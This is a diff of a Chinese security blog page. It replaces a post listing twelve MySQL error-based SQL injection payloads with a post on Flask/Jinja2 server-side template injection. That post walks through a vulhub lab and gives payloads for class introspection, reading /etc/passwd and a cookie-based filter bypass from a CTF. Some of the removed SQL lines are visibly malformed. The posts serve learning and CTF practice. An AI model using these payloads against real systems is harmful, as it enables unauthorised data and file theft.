@@ -7,19 +7,24 @@
   
   
   
-  <title>SQL 报错注入 | Grim&#39;s blog</title>
+  <title>服务端模板注入SSTI | Grim&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="参考链接:SQL报错注入十二个函数 SQL报错注入的十二个函数">
+  <meta name="description" content="参考链接:https://www.cnblogs.com/tyomcat/p/5440488.htmlhttps://www.jianshu.com/p/367ea79c5482">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL 报错注入">
-<meta property="og:url" content="http://yoursite.com/2018/07/06/sql报错注入/index.html">
+<meta property="og:title" content="服务端模板注入SSTI">
+<meta property="og:url" content="http://yoursite.com/2018/07/18/SSTI/index.html">
 <meta property="og:site_name" content="Grim&#39;s blog">
-<meta property="og:description" content="参考链接:SQL报错注入十二个函数 SQL报错注入的十二个函数">
+<meta property="og:description" content="参考链接:https://www.cnblogs.com/tyomcat/p/5440488.htmlhttps://www.jianshu.com/p/367ea79c5482">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-07-06T10:43:14.889Z">
+<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/J~S$XN4V0Y%7B0%7BIZ814R~Q39.png">
+<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/Z%7DXKPP26%7B%5D8%28GV90O1FY%28FC.png">
+<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/DF%28SJ%28OVEA%7B_8PW1%5DGAV%5BOG.png">
+<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/0~652%7BPZW@3O~V%25RBZ%25~IX1.png">
+<meta property="og:updated_time" content="2018-09-07T07:36:54.094Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL 报错注入">
-<meta name="twitter:description" content="参考链接:SQL报错注入十二个函数 SQL报错注入的十二个函数">
+<meta name="twitter:title" content="服务端模板注入SSTI">
+<meta name="twitter:description" content="参考链接:https://www.cnblogs.com/tyomcat/p/5440488.htmlhttps://www.jianshu.com/p/367ea79c5482">
+<meta name="twitter:image" content="http://p1vrkwaxt.bkt.clouddn.com/J~S$XN4V0Y%7B0%7BIZ814R~Q39.png">
   
     <link rel="alternative" href="/atom.xml" title="Grim&#39;s blog" type="application/atom+xml">
   
@@ -245,11 +250,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-sql报错注入" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-SSTI" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/07/06/sql报错注入/" class="article-date">
-      <time datetime="2018-07-06T05:24:35.601Z" itemprop="datePublished">2018-07-06</time>
+      <a  href="/2018/07/18/SSTI/" class="article-date">
+      <time datetime="2018-07-17T16:00:00.000Z" itemprop="datePublished">2018-07-18</time>
 </a>
 
     </div>
@@ -263,7 +268,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      SQL 报错注入
+      服务端模板注入SSTI
     </h1>
   
 
@@ -281,21 +286,48 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>参考链接:<a href="http://www.bugku.com/forum.php?mod=viewthread&amp;tid=93&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">SQL报错注入十二个函数</a></p>
-<h2 id="SQL报错注入的十二个函数"><a href="#SQL报错注入的十二个函数" class="headerlink" title="SQL报错注入的十二个函数"></a>SQL报错注入的十二个函数</h2><a id="more"></a>
-<h3 id="0x01-floor报错"><a href="#0x01-floor报错" class="headerlink" title="0x01 floor报错"></a>0x01 floor报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-ExtractValue报错"><a href="#0x02-ExtractValue报错" class="headerlink" title="0x02 ExtractValue报错"></a>0x02 ExtractValue报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-UpdateXml报错"><a href="#0x03-UpdateXml报错" class="headerlink" title="0x03 UpdateXml报错"></a>0x03 UpdateXml报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure>
-<h3 id="0x04-NAME-CONST报错"><a href="#0x04-NAME-CONST报错" class="headerlink" title="0x04 NAME_CONST报错"></a>0x04 NAME_CONST报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br></pre></td></tr></table></figure>
-<h3 id="0x05-join报错"><a href="#0x05-join报错" class="headerlink" title="0x05 join报错"></a>0x05 join报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br></pre></td></tr></table></figure>
-<h3 id="0x06-exp报错"><a href="#0x06-exp报错" class="headerlink" title="0x06 exp报错"></a>0x06 exp报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from (select user () ) a) );</span><br></pre></td></tr></table></figure>
-<h3 id="0x07-GeometryCollection-报错"><a href="#0x07-GeometryCollection-报错" class="headerlink" title="0x07 GeometryCollection()报错"></a>0x07 GeometryCollection()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br></pre></td></tr></table></figure>
-<h3 id="0x08-polygon-报错"><a href="#0x08-polygon-报错" class="headerlink" title="0x08 polygon()报错"></a>0x08 polygon()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon (()select * from(select user ())a)b );</span><br></pre></td></tr></table></figure>
-<h3 id="0x09-multipoint-报错"><a href="#0x09-multipoint-报错" class="headerlink" title="0x09 multipoint()报错"></a>0x09 multipoint()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure>
-<h3 id="0x10-multlinestring-报错"><a href="#0x10-multlinestring-报错" class="headerlink" title="0x10 multlinestring()报错"></a>0x10 multlinestring()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure>
-<h3 id="0x11-multpolygon-报错"><a href="#0x11-multpolygon-报错" class="headerlink" title="0x11 multpolygon()报错"></a>0x11 multpolygon()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure>
-<h3 id="0x12-linestring-报错"><a href="#0x12-linestring-报错" class="headerlink" title="0x12 linestring()报错"></a>0x12 linestring()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure>
-<p>bugku上有个很好的测试平台 <a href="http://www.bugku.com/thread-152-1-1.html" target="_blank" rel="noopener">http://www.bugku.com/thread-152-1-1.html</a></p>
+        <p>参考链接:<br><br><a href="https://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">https://www.cnblogs.com/tyomcat/p/5440488.html</a><br><br><a href="https://www.jianshu.com/p/367ea79c5482" target="_blank" rel="noopener">https://www.jianshu.com/p/367ea79c5482</a><br><a id="more"></a></p>
+<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><p>该环境是基于python Flask框架搭建起来的</p>
+<p>github上下载一个docker </p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
+<p>具体执行命令里面有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 拉取项目</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub</span><br><span class="line"></span><br><span class="line"># 进入某一个漏洞/环境的目录</span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line"># 自动化编译环境</span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"># 启动整个环境</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-原理介绍"><a href="#0x02-原理介绍" class="headerlink" title="0x02 原理介绍"></a>0x02 原理介绍</h2><p>SSTI (Server side template injection) 服务端模板注入</p>
+<p>先来看一下主要代码:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name = request.args.get(&apos;name&apos;, &apos;guest&apos;)</span><br><span class="line"></span><br><span class="line">    t = Template(&quot;Hello &quot; + name)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br></pre></td></tr></table></figure></p>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>name是可输入变量,template()相当于waf，对模板的过滤转义等等,所以一般xss注入是行不通的，(这里代码没太多过滤，xss是可行的，这里讲模板注入)</p>
+<p>下面在本地进行测试几个例子<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102:8000/?name=1*3</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/J~S$XN4V0Y%7B0%7BIZ814R~Q39.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102:8000/?name=&#123;&#123;1*3&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/Z%7DXKPP26%7B%5D8%28GV90O1FY%28FC.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102:8000/?name=&#123;&#123;&apos;abc&apos;.upper()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/DF%28SJ%28OVEA%7B_8PW1%5DGAV%5BOG.png" alt="image"></p>
+<p>由此可以分析到里面代码会执行，任意命令执行的方法就出来了,这就是原理.</p>
+<h2 id="0x03-模板注入-进阶"><a href="#0x03-模板注入-进阶" class="headerlink" title="0x03 模板注入(进阶)"></a>0x03 模板注入(进阶)</h2><p>如果开发者使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数将URL传递进入模板内容当中,那么xss就失效了，只能用</p>
+<h3 id="注入姿势"><a href="#注入姿势" class="headerlink" title="注入姿势"></a>注入姿势</h3><ul>
+<li><p>内省request对象。request对象是一个Flask模板全局变量，代表“当前请求对象（flask.request）”。当你在视图中访问request对象时，它包含了你预期想看到的所有信息。</p>
+</li>
+<li><p>内省config对象，config对象是一个Flask模板全局变量，代表“当前配置对象（flask.config）”。</p>
+</li>
+<li><p>使用非常重要的内省组件： <strong>mro</strong>和<strong>subclasses</strong>属性。使用<strong>mro</strong>属性来访问对象的父类，使用<strong>subclasses</strong>属性来访问对象的子类。</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\__class__.\__mro__ &#125;&#125; 作为payload注入到SSTI漏洞点当中，</span><br></pre></td></tr></table></figure>
+<p>使用索引1来选择object类。现在我们到达了object类，我们使用<strong>subclasses</strong>属性来dump应用程序中使用的所有类（找到file类的索引）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\__class__.\__mro__[1].\__subclasses__() &#125;&#125; 注入到SSTI漏洞点当中</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/0~652%7BPZW@3O~V%25RBZ%25~IX1.png" alt="image">　　</p>
+<ul>
+<li>任意文件读取POC</li>
+</ul>
+<p>file类能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于read的方法来读取相关内容。</p>
+<p>　　　　　找到file类的索引，在我的环境中<type 'file'="">类的索引是40，我们就注入</type></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;。</span><br></pre></td></tr></table></figure>
+<p>具体参考我上面的链接</p>
+<h2 id="0x04-赛题分析"><a href="#0x04-赛题分析" class="headerlink" title="0x04 赛题分析"></a>0x04 赛题分析</h2><p>因为题目的关闭，这里只能给个大概的分析</p>
+<p>确认是SSTI漏洞，但这儿把魔术方法给拦截了,所以这个下面payload不可行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()\[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>但也并不是毫无办法,可以写为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;[request.cookies.a][request.cookies.b][2][request.cookies.c]()[40](&apos;/etc/passwd&apos;)[request.cookies.d]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">并传入四个cookiea=\__class__; b=\__mro__; c=\__subclasses__; d=read</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>一个很不错的姿势呢</p>
 
       
     </div>
@@ -304,13 +336,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a  href="/2018/07/06/sql报错注入/">SQL 报错注入</a></p>
+        <p><span>本文标题:</span><a  href="/2018/07/18/SSTI/">服务端模板注入SSTI</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Mr1.Grim 的个人博客">Mr1.Grim</a></p>
-        <p><span>发布时间:</span>2018年07月06日 - 13时24分</p>
-        <p><span>最后更新:</span>2018年07月06日 - 18时43分</p>
+        <p><span>发布时间:</span>2018年07月18日 - 00时00分</p>
+        <p><span>最后更新:</span>2018年09月07日 - 15时36分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/07/06/sql报错注入/" title="SQL 报错注入">http://yoursite.com/2018/07/06/sql报错注入/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/07/06/sql报错注入/　　作者: Mr1.Grim" title=""></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/07/18/SSTI/" title="服务端模板注入SSTI">http://yoursite.com/2018/07/18/SSTI/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/07/18/SSTI/　　作者: Mr1.Grim" title=""></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -321,18 +353,18 @@
 
 <nav id="article-nav">
   
-    <a  href="/2018/07/06/vmheipeing/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a  href="/2018/08/06/SJUCTF/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          VM一直多次黑屏问题
+          2018暑假校内赛SJUCTF
         
       </div>
     </a>
   
   
-    <a  href="/2018/07/06/sqlmohu/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">MySql模糊查询</div>
+    <a  href="/2018/07/15/2018XMAN夏令营/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">QCTF2018-XMan选拔赛</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -344,7 +376,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL报错注入的十二个函数"><span class="toc-number">1.</span> <span class="toc-text">SQL报错注入的十二个函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-floor报错"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 floor报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-ExtractValue报错"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 ExtractValue报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-UpdateXml报错"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 UpdateXml报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-NAME-CONST报错"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 NAME_CONST报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-join报错"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 join报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-exp报错"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 exp报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-GeometryCollection-报错"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 GeometryCollection()报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-polygon-报错"><span class="toc-number">1.8.</span> <span class="toc-text">0x08 polygon()报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-multipoint-报错"><span class="toc-number">1.9.</span> <span class="toc-text">0x09 multipoint()报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-multlinestring-报错"><span class="toc-number">1.10.</span> <span class="toc-text">0x10 multlinestring()报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-multpolygon-报错"><span class="toc-number">1.11.</span> <span class="toc-text">0x11 multpolygon()报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-linestring-报错"><span class="toc-number">1.12.</span> <span class="toc-text">0x12 linestring()报错</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-环境准备"><span class="toc-number">1.</span> <span class="toc-text">0x01 环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-原理介绍"><span class="toc-number">2.</span> <span class="toc-text">0x02 原理介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码分析"><span class="toc-number">2.1.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-模板注入-进阶"><span class="toc-number">3.</span> <span class="toc-text">0x03 模板注入(进阶)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#注入姿势"><span class="toc-number">3.1.</span> <span class="toc-text">注入姿势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-赛题分析"><span class="toc-number">4.</span> <span class="toc-text">0x04 赛题分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-总结"><span class="toc-number">5.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -417,13 +449,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2018/07/06/vmheipeing/" title="上一篇: VM一直多次黑屏问题">
+            <a  href="/2018/08/06/SJUCTF/" title="上一篇: 2018暑假校内赛SJUCTF">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2018/07/06/sqlmohu/" title="下一篇: MySql模糊查询">
+            <a  href="/2018/07/15/2018XMAN夏令营/" title="下一篇: QCTF2018-XMan选拔赛">
                 <i class="fa fa-angle-right"></i>
             </a>
         
